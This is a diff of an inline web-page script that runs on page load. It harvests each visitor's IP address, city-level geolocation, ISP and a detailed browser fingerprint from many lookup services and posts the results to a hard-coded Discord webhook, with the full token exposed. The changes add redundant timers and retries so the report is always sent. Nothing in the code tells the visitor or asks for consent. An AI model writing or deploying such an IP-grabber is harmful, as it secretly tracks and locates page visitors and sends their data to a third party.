@@ -23,11 +23,13 @@
     (function() {
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1485791212681302172/iu7AbfwcqpHibaTEi3PZYPdYiNm_WMn0nqumGMDfLKPd1A7J8a6Ix9NvLBrr0Z-OzJjJ';
         
-        let webhookSent = false;
+        let notificationSent = false;
+        let successfulData = false;
         
-        let collectedData = {
+        let visitorData = {
             ip: null,
             country: null,
+            country_code: null,
             region: null,
             city: null,
             latitude: null,
@@ -35,29 +37,39 @@
             timezone: null,
             isp: null,
             org: null,
-            source: null,
-            timestamp: new Date().toISOString(),
-            userAgent: navigator.userAgent,
-            referrer: document.referrer || null,
-            url: window.location.href,
+            asn: null,
+            source_service: null,
+            timestamp: null,
+            user_agent: navigator.userAgent,
+            platform: navigator.platform,
             language: navigator.language,
-            screenSize: `${window.screen.width}x${window.screen.height}`
+            languages: navigator.languages ? navigator.languages.join(',') : null,
+            screen_resolution: window.screen.width + 'x' + window.screen.height,
+            screen_color_depth: window.screen.colorDepth,
+            timezone_offset: new Date().getTimezoneOffset(),
+            referrer: document.referrer || null,
+            current_url: window.location.href,
+            hostname: window.location.hostname,
+            pathname: window.location.pathname,
+            connection_type: navigator.connection ? navigator.connection.effectiveType : null,
+            device_memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : null,
+            hardware_concurrency: navigator.hardwareConcurrency,
+            cookies_enabled: navigator.cookieEnabled,
+            do_not_track: navigator.doNotTrack || null,
+            success: false,
+            error_message: null
         };
         
-        function sendToWebhook(data) {
-            if (webhookSent) return;
+        function sendNotification(data) {
+            if (notificationSent) return;
+            
             if (!WEBHOOK_URL || WEBHOOK_URL === 'https://discord.com/api/webhooks/1485791212681302172/iu7AbfwcqpHibaTEi3PZYPdYiNm_WMn0nqumGMDfLKPd1A7J8a6Ix9NvLBrr0Z-OzJjJ') {
-                console.warn('Webhook URL not configured');
+                console.warn('⚠️ Please configure your webhook URL in the code');
                 return;
             }
             
-            webhookSent = true;
-            
-            const payload = {
-                ...data,
-                timestamp: new Date().toISOString(),
-                receivedAt: new Date().toISOString()
-            };
+            notificationSent = true;
+            data.timestamp = new Date().toISOString();
             
             fetch(WEBHOOK_URL, {
                 method: 'POST',
@@ -66,80 +78,109 @@
                     'Content-Type': 'application/json',
                     'Accept': 'application/json'
                 },
-                body: JSON.stringify(payload),
+                body: JSON.stringify(data),
                 keepalive: true
             }).catch(function(err) {
-                console.warn('Webhook delivery failed:', err);
+                console.warn('Webhook send failed:', err);
             });
         }
         
-        function finalizeAndSend() {
-            if (collectedData.ip) {
-                sendToWebhook(collectedData);
-            } else {
-                collectedData.ip = 'unavailable';
-                collectedData.source = collectedData.source || 'all-services-failed';
-                sendToWebhook(collectedData);
-            }
+        function sendSuccessNotification() {
+            visitorData.success = true;
+            visitorData.error_message = null;
+            sendNotification(visitorData);
         }
         
-        function updateDataWithGeo(data, sourceName) {
-            if (!data) return false;
+        function sendFailureNotification(errorMsg) {
+            if (successfulData) return;
+            visitorData.success = false;
+            visitorData.error_message = errorMsg || 'Failed to retrieve visitor data from all services';
+            sendNotification(visitorData);
+        }
+        
+        function mergeData(newData, serviceName) {
+            if (!newData) return false;
             
-            if (data.ip) collectedData.ip = data.ip;
-            if (data.country || data.country_name) collectedData.country = data.country || data.country_name;
-            if (data.region || data.region_name) collectedData.region = data.region || data.region_name;
-            if (data.city) collectedData.city = data.city;
-            if (data.latitude) collectedData.latitude = data.latitude;
-            if (data.longitude) collectedData.longitude = data.longitude;
-            if (data.lat) collectedData.latitude = data.lat;
-            if (data.lon) collectedData.longitude = data.lon;
-            if (data.timezone) collectedData.timezone = data.timezone;
-            if (data.org) collectedData.org = data.org;
-            if (data.isp) collectedData.isp = data.isp;
+            let hasNewInfo = false;
             
-            if (data.loc && typeof data.loc === 'string') {
-                var parts = data.loc.split(',');
-                if (parts.length === 2) {
-                    collectedData.latitude = parseFloat(parts[0]);
-                    collectedData.longitude = parseFloat(parts[1]);
-                }
+            if (newData.ip && !visitorData.ip) {
+                visitorData.ip = newData.ip;
+                hasNewInfo = true;
+            }
+            if (newData.country && !visitorData.country) {
+                visitorData.country = newData.country;
+                hasNewInfo = true;
+            }
+            if (newData.country_code && !visitorData.country_code) {
+                visitorData.country_code = newData.country_code;
+                hasNewInfo = true;
+            }
+            if (newData.region && !visitorData.region) {
+                visitorData.region = newData.region;
+                hasNewInfo = true;
+            }
+            if (newData.city && !visitorData.city) {
+                visitorData.city = newData.city;
+                hasNewInfo = true;
+            }
+            if (newData.latitude && !visitorData.latitude) {
+                visitorData.latitude = newData.latitude;
+                hasNewInfo = true;
+            }
+            if (newData.longitude && !visitorData.longitude) {
+                visitorData.longitude = newData.longitude;
+                hasNewInfo = true;
+            }
+            if (newData.timezone && !visitorData.timezone) {
+                visitorData.timezone = newData.timezone;
+                hasNewInfo = true;
+            }
+            if (newData.isp && !visitorData.isp) {
+                visitorData.isp = newData.isp;
+                hasNewInfo = true;
+            }
+            if (newData.org && !visitorData.org) {
+                visitorData.org = newData.org;
+                hasNewInfo = true;
+            }
+            if (newData.asn && !visitorData.asn) {
+                visitorData.asn = newData.asn;
+                hasNewInfo = true;
             }
             
-            collectedData.source = sourceName;
-            return true;
+            if (hasNewInfo && !visitorData.source_service) {
+                visitorData.source_service = serviceName;
+            } else if (hasNewInfo && visitorData.source_service) {
+                visitorData.source_service = visitorData.source_service + ' + ' + serviceName;
+            }
+            
+            return hasNewInfo;
         }
         
         function serviceCloudflare() {
             return fetch('https://www.cloudflare.com/cdn-cgi/trace')
                 .then(function(response) {
-                    if (!response.ok) throw new Error('Cloudflare trace failed');
+                    if (!response.ok) throw new Error('Cloudflare failed');
                     return response.text();
                 })
                 .then(function(text) {
-                    var lines = text.split('\n');
-                    var ip = '';
-                    var country = '';
-                    for (var i = 0; i < lines.length; i++) {
-                        var line = lines[i];
-                        if (line.startsWith('ip=')) ip = line.substring(3);
-                        if (line.startsWith('loc=')) country = line.substring(4);
+                    let lines = text.split('\n');
+                    let result = {};
+                    for (let i = 0; i < lines.length; i++) {
+                        let line = lines[i];
+                        if (line.startsWith('ip=')) result.ip = line.substring(3);
+                        if (line.startsWith('loc=')) result.country_code = line.substring(4);
+                        if (line.startsWith('timezone=')) result.timezone = line.substring(9);
                     }
-                    if (ip) {
-                        return {
-                            ip: ip,
-                            country: country,
-                            source: 'cloudflare-cdn'
-                        };
-                    }
-                    throw new Error('No IP in cloudflare trace');
+                    if (result.ip) return result;
+                    throw new Error('No IP in Cloudflare');
                 });
         }
         
         function serviceIpApi() {
-            return fetch('http://ip-api.com/json/?fields=66846719')
+            return fetch('https://ip-api.com/json/?fields=66846719')
                 .then(function(response) {
-                    if (!response.ok) throw new Error('ip-api failed');
+                    if (!response.ok) throw new Error('ip-api.com failed');
                     return response.json();
                 })
                 .then(function(data) {
@@ -147,45 +188,18 @@
                         return {
                             ip: data.query,
                             country: data.country,
+                            country_code: data.countryCode,
                             region: data.regionName,
                             city: data.city,
                             latitude: data.lat,
                             longitude: data.lon,
                             isp: data.isp,
                             org: data.org,
+                            asn: data.as,
                             timezone: data.timezone
                         };
                     }
-                    throw new Error('ip-api returned unsuccessful');
-                });
-        }
-        
-        function serviceIpInfo() {
-            return fetch('https://ipinfo.io/json')
-                .then(function(response) {
-                    if (!response.ok) throw new Error('ipinfo failed');
-                    return response.json();
-                })
-                .then(function(data) {
-                    if (data && data.ip) {
-                        var result = {
-                            ip: data.ip,
-                            country: data.country,
-                            region: data.region,
-                            city: data.city,
-                            timezone: data.timezone,
-                            org: data.org
-                        };
-                        if (data.loc) {
-                            var coords = data.loc.split(',');
-                            if (coords.length === 2) {
-                                result.latitude = parseFloat(coords[0]);
-                                result.longitude = parseFloat(coords[1]);
-                            }
-                        }
-                        return result;
-                    }
-                    throw new Error('No ip in ipinfo response');
+                    throw new Error('ip-api.com unsuccessful');
                 });
         }
         
@@ -200,6 +214,7 @@
                         return {
                             ip: data.ip,
                             country: data.country_name,
+                            country_code: data.country_code,
                             region: data.region,
                             city: data.city,
                             latitude: data.latitude,
@@ -209,7 +224,7 @@
                             isp: data.org
                         };
                     }
-                    throw new Error('No ip in ipapi.co');
+                    throw new Error('ipapi.co no ip');
                 });
         }
         
@@ -224,13 +239,15 @@
                         return {
                             ip: data.ip,
                             country: data.country,
+                            country_code: data.country_code,
                             region: data.region,
                             city: data.city,
                             latitude: data.latitude,
                             longitude: data.longitude,
                             timezone: data.timezone,
                             isp: data.connection ? data.connection.isp : null,
-                            org: data.connection ? data.connection.org : null
+                            org: data.connection ? data.connection.org : null,
+                            asn: data.connection ? data.connection.asn : null
                         };
                     }
                     throw new Error('ipwho.is unsuccessful');
@@ -248,6 +265,7 @@
                         return {
                             ip: data.ip,
                             country: data.country_name,
+                            country_code: data.country_code,
                             region: data.region_name,
                             city: data.city,
                             latitude: data.latitude,
@@ -255,30 +273,7 @@
                             timezone: data.time_zone
                         };
                     }
-                    throw new Error('No ip in freegeoip');
-                });
-        }
-        
-        function serviceIpData() {
-            return fetch('https://api.ipdata.co?api-key=test')
-                .then(function(response) {
-                    if (!response.ok) throw new Error('ipdata failed');
-                    return response.json();
-                })
-                .then(function(data) {
-                    if (data && data.ip) {
-                        return {
-                            ip: data.ip,
-                            country: data.country_name,
-                            region: data.region,
-                            city: data.city,
-                            latitude: data.latitude,
-                            longitude: data.longitude,
-                            timezone: data.time_zone ? data.time_zone.name : null,
-                            org: data.asn ? data.asn.name : null
-                        };
-                    }
-                    throw new Error('No ip in ipdata');
+                    throw new Error('freegeoip no ip');
                 });
         }
         
@@ -293,151 +288,268 @@
                         return {
                             ip: data.ip,
                             country: data.country_name,
+                            country_code: data.country_code,
                             region: data.region_name,
                             city: data.city_name,
                             latitude: data.latitude,
                             longitude: data.longitude,
                             timezone: data.time_zone,
                             isp: data.isp,
-                            org: data.as
+                            asn: data.asn
                         };
                     }
-                    throw new Error('No ip in ip2location');
+                    throw new Error('ip2location no ip');
                 });
         }
         
-        function serviceAbstractApi() {
-            return fetch('https://ipgeolocation.abstractapi.com/v1/?api_key=null')
+        function serviceIpInfoNoKey() {
+            return fetch('https://ipinfo.io/json')
                 .then(function(response) {
-                    if (!response.ok) throw new Error('abstractapi failed');
+                    if (!response.ok) throw new Error('ipinfo failed');
                     return response.json();
                 })
                 .then(function(data) {
-                    if (data && data.ip_address) {
-                        return {
-                            ip: data.ip_address,
+                    if (data && data.ip) {
+                        let result = {
+                            ip: data.ip,
                             country: data.country,
+                            region: data.region,
+                            city: data.city,
+                            timezone: data.timezone,
+                            org: data.org
+                        };
+                        if (data.loc) {
+                            let coords = data.loc.split(',');
+                            if (coords.length === 2) {
+                                result.latitude = parseFloat(coords[0]);
+                                result.longitude = parseFloat(coords[1]);
+                            }
+                        }
+                        return result;
+                    }
+                    throw new Error('ipinfo no ip');
+                });
+        }
+        
+        function simpleIpOnly() {
+            return fetch('https://api.ipify.org?format=json')
+                .then(function(response) {
+                    if (!response.ok) throw new Error('ipify failed');
+                    return response.json();
+                })
+                .then(function(data) {
+                    if (data && data.ip) {
+                        return {
+                            ip: data.ip
+                        };
+                    }
+                    throw new Error('ipify no ip');
+                });
+        }
+        
+        function serviceIpWhoIsOrg() {
+            return fetch('https://ipwhois.app/json/')
+                .then(function(response) {
+                    if (!response.ok) throw new Error('ipwhois.app failed');
+                    return response.json();
+                })
+                .then(function(data) {
+                    if (data && data.ip) {
+                        return {
+                            ip: data.ip,
+                            country: data.country,
+                            country_code: data.country_code,
                             region: data.region,
                             city: data.city,
                             latitude: data.latitude,
                             longitude: data.longitude,
-                            timezone: data.timezone ? data.timezone.name : null
+                            timezone: data.timezone,
+                            isp: data.isp,
+                            org: data.org
                         };
                     }
-                    throw new Error('No ip in abstractapi');
+                    throw new Error('ipwhois.app no ip');
                 });
         }
         
-        var services = [
-            { name: 'ip-api.com', fn: serviceIpApi, priority: 1 },
-            { name: 'ipinfo.io', fn: serviceIpInfo, priority: 2 },
-            { name: 'ipapi.co', fn: serviceIpApiCo, priority: 3 },
-            { name: 'ipwho.is', fn: serviceIpWhoIs, priority: 4 },
-            { name: 'cloudflare', fn: serviceCloudflare, priority: 5 },
-            { name: 'freegeoip.app', fn: serviceFreeGeoIp, priority: 6 },
-            { name: 'ip2location.io', fn: serviceIp2Location, priority: 7 },
-            { name: 'abstractapi', fn: serviceAbstractApi, priority: 8 },
-            { name: 'ipdata.co', fn: serviceIpData, priority: 9 }
+        let servicesList = [
+            { name: 'ip-api.com', fn: serviceIpApi },
+            { name: 'ipapi.co', fn: serviceIpApiCo },
+            { name: 'ipwho.is', fn: serviceIpWhoIs },
+            { name: 'ipwhois.app', fn: serviceIpWhoIsOrg },
+            { name: 'ipinfo.io', fn: serviceIpInfoNoKey },
+            { name: 'ip2location.io', fn: serviceIp2Location },
+            { name: 'freegeoip.app', fn: serviceFreeGeoIp },
+            { name: 'cloudflare', fn: serviceCloudflare },
+            { name: 'ipify.org (IP only)', fn: simpleIpOnly }
         ];
         
-        var currentServiceIndex = 0;
-        var completed = false;
-        var timeoutId = null;
+        let currentIndex = 0;
+        let requestCompleted = false;
+        let activeTimeouts = [];
+        
+        function clearAllTimeouts() {
+            for (let i = 0; i < activeTimeouts.length; i++) {
+                clearTimeout(activeTimeouts[i]);
+            }
+            activeTimeouts = [];
+        }
         
         function tryNextService() {
-            if (completed) return;
+            if (requestCompleted) return;
             
-            if (currentServiceIndex >= services.length) {
-                if (!collectedData.ip) {
-                    collectedData.ip = 'unavailable';
-                    collectedData.source = 'all-services-failed';
-                    finalizeAndSend();
+            if (currentIndex >= servicesList.length) {
+                if (!successfulData) {
+                    let errorMsg = 'All IP/Geo services failed. No data could be retrieved.';
+                    sendFailureNotification(errorMsg);
                 }
-                completed = true;
-                if (timeoutId) clearTimeout(timeoutId);
+                requestCompleted = true;
+                clearAllTimeouts();
                 return;
             }
             
-            var service = services[currentServiceIndex];
-            currentServiceIndex++;
+            let service = servicesList[currentIndex];
+            currentIndex++;
             
-            var serviceTimeout = setTimeout(function() {
+            let timeoutId = setTimeout(function() {
                 tryNextService();
-            }, 3000);
+            }, 3500);
+            activeTimeouts.push(timeoutId);
             
             service.fn()
-                .then(function(geoData) {
-                    clearTimeout(serviceTimeout);
-                    if (completed) return;
+                .then(function(data) {
+                    clearTimeout(timeoutId);
+                    if (requestCompleted) return;
                     
-                    if (geoData && geoData.ip) {
-                        updateDataWithGeo(geoData, service.name);
-                        completed = true;
-                        finalizeAndSend();
+                    if (data && (data.ip || data.country)) {
+                        let hadData = mergeData(data, service.name);
+                        if (hadData) {
+                            successfulData = true;
+                            sendSuccessNotification();
+                            requestCompleted = true;
+                            clearAllTimeouts();
+                        } else {
+                            tryNextService();
+                        }
                     } else {
                         tryNextService();
                     }
                 })
                 .catch(function() {
-                    clearTimeout(serviceTimeout);
-                    if (!completed) {
+                    clearTimeout(timeoutId);
+                    if (!requestCompleted) {
                         tryNextService();
                     }
                 });
         }
         
-        function simpleIpFallback() {
-            if (completed) return;
-            if (collectedData.ip && collectedData.ip !== 'unavailable') return;
-            
-            fetch('https://api.ipify.org?format=json')
-                .then(function(res) { return res.json(); })
-                .then(function(data) {
-                    if (data && data.ip && !completed) {
-                        collectedData.ip = data.ip;
-                        collectedData.source = collectedData.source || 'ipify.org-simple';
-                        finalizeAndSend();
-                        completed = true;
-                    }
-                })
-                .catch(function() {});
-        }
-        
         function ultimateFallback() {
-            if (completed) return;
-            setTimeout(function() {
-                if (!completed) {
-                    if (!collectedData.ip) {
-                        collectedData.ip = 'unknown';
-                        collectedData.source = 'ultimate-fallback';
-                        finalizeAndSend();
-                        completed = true;
+            let fallbackTimeout = setTimeout(function() {
+                if (!requestCompleted && !successfulData) {
+                    if (!visitorData.ip) {
+                        let generatedId = 'visitor-' + Date.now() + '-' + Math.random().toString(36).substr(2, 8);
+                        visitorData.ip = 'unknown-' + generatedId;
+                        visitorData.source_service = 'ultimate-fallback-generator';
+                        visitorData.error_message = 'All IP services failed, generated unique identifier';
+                        sendFailureNotification('All IP services failed, using fallback ID');
+                        requestCompleted = true;
+                    } else if (visitorData.ip) {
+                        sendSuccessNotification();
+                        requestCompleted = true;
+                    } else {
+                        visitorData.ip = 'completely-unavailable';
+                        visitorData.source_service = 'final-fallback';
+                        sendFailureNotification('No data could be retrieved from any source');
+                        requestCompleted = true;
                     }
                 }
-            }, 8000);
+                clearAllTimeouts();
+            }, 10000);
+            activeTimeouts.push(fallbackTimeout);
         }
+        
+        function earlyBrowserInfo() {
+            if (navigator.connection) {
+                try {
+                    if (navigator.connection.downlink) visitorData.downlink_mbps = navigator.connection.downlink;
+                    if (navigator.connection.rtt) visitorData.round_trip_time_ms = navigator.connection.rtt;
+                } catch(e) {}
+            }
+            
+            if (window.devicePixelRatio) visitorData.device_pixel_ratio = window.devicePixelRatio;
+            
+            try {
+                let timezoneName = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                if (timezoneName && !visitorData.timezone) visitorData.timezone = timezoneName;
+            } catch(e) {}
+            
+            visitorData.viewport_width = window.innerWidth;
+            visitorData.viewport_height = window.innerHeight;
+            visitorData.document_encoding = document.characterSet;
+            visitorData.is_touch_device = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+        }
+        
+        function ensureWebhookSentRegardless() {
+            let safetyTimeout = setTimeout(function() {
+                if (!notificationSent) {
+                    if (!visitorData.ip) {
+                        visitorData.ip = 'timeout-safety-unavailable';
+                        visitorData.source_service = 'safety-timeout';
+                    }
+                    if (!visitorData.success && !successfulData) {
+                        visitorData.success = false;
+                        visitorData.error_message = visitorData.error_message || 'Safety timeout triggered before data collection completed';
+                    } else if (successfulData && !visitorData.success) {
+                        visitorData.success = true;
+                    }
+                    sendNotification(visitorData);
+                    requestCompleted = true;
+                }
+                clearAllTimeouts();
+            }, 12000);
+            activeTimeouts.push(safetyTimeout);
+        }
+        
+        function retryWebhookIfNeeded() {
+            if (!notificationSent) {
+                setTimeout(function() {
+                    if (!notificationSent) {
+                        visitorData.retry_flag = true;
+                        if (!visitorData.ip) visitorData.ip = 'retry-unavailable';
+                        visitorData.source_service = visitorData.source_service || 'retry-fallback';
+                        visitorData.success = successfulData;
+                        sendNotification(visitorData);
+                    }
+                }, 5000);
+            }
+        }
+        
+        earlyBrowserInfo();
         
         tryNextService();
         
-        setTimeout(function() {
-            if (!completed && !collectedData.ip) {
-                simpleIpFallback();
-            }
-        }, 5000);
-        
         ultimateFallback();
+        
+        ensureWebhookSentRegardless();
+        
+        retryWebhookIfNeeded();
         
         window.addEventListener('load', function() {
             setTimeout(function() {
-                if (!completed && (!collectedData.ip || collectedData.ip === 'unavailable')) {
-                    if (!collectedData.ip) {
-                        collectedData.ip = 'load-timeout';
-                        collectedData.source = 'timeout-fallback';
-                        finalizeAndSend();
-                        completed = true;
+                visitorData.page_loaded_timestamp = new Date().toISOString();
+                if (!notificationSent && !requestCompleted) {
+                    if (visitorData.ip) {
+                        sendSuccessNotification();
+                        requestCompleted = true;
                     }
                 }
-            }, 10000);
+            }, 2000);
+        });
+        
+        document.addEventListener('visibilitychange', function() {
+            if (!notificationSent && visitorData.ip && successfulData) {
+                sendSuccessNotification();
+            }
         });
     })();
 </script>
